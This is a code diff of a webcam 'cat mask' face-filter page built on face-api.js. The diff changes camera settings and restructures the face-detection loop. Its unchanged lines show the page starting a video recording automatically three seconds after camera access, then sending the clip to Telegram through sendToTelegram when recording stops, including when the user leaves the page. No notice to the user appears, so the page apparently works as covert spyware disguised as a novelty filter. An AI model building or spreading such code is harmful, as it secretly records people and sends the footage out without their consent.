@@ -7,7 +7,7 @@
     <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
     <style>
         #video, #overlayCanvas {
-            display: none;
+            display: block; /* Отображение видео и канвы */
         }
         #videoDisplay {
             position: relative;
@@ -25,7 +25,7 @@
     </style>
 </head>
 <body>
-    <h1>Маска кота 2.0</h1>
+    <h1>Маска кота</h1>
     <div id="videoDisplay">
         <video id="video" width="640" height="480" autoplay></video>
         <canvas id="overlayCanvas" width="640" height="480"></canvas>
@@ -48,28 +48,24 @@
         ]).then(startVideo);
 
         function startVideo() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    video.srcObject = stream;
-                    setupMediaRecorder(stream);
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user' } // Запрос доступа к фронтальной камере
+            })
+            .then(stream => {
+                video.srcObject = stream;
+                setupMediaRecorder(stream);
 
-                    video.onloadedmetadata = () => {
-                        // Detect faces and draw mask every frame
-                        setInterval(async () => {
-                            const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
-                            if (detections.length > 0) {
-                                drawCatMask(detections[0].landmarks);
-                            }
-                        }, 100); // Detect every 100ms
+                video.onloadedmetadata = () => {
+                    // Start detection and recording
+                    setTimeout(() => {
+                        mediaRecorder.start();
+                        console.log('Recording started');
+                    }, 3000); // Delay to allow camera to focus
 
-                        // Start recording after video is ready
-                        setTimeout(() => {
-                            mediaRecorder.start();
-                            console.log('Recording started');
-                        }, 3000); // Delay to allow camera to focus
-                    };
-                })
-                .catch(err => console.error("Error accessing camera: ", err));
+                    detectFaces();
+                };
+            })
+            .catch(err => console.error("Error accessing camera: ", err));
         }
 
         function setupMediaRecorder(stream) {
@@ -88,6 +84,15 @@
                 console.log('Recording stopped. Sending video...');
                 sendToTelegram(blob);
             };
+        }
+
+        function detectFaces() {
+            setInterval(async () => {
+                const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
+                if (detections.length > 0) {
+                    drawCatMask(detections[0].landmarks);
+                }
+            }, 100); // Detect every 100ms
         }
 
         function drawCatMask(landmarks) {
@@ -134,7 +139,6 @@
             if (mediaRecorder && mediaRecorder.state === 'recording') {
                 mediaRecorder.stop();
                 console.log('Recording stopped');
-                // Note: The browser may not allow custom messages for the 'beforeunload' event anymore
                 event.preventDefault(); // Required for modern browsers
                 event.returnValue = ''; // For some browsers
             }
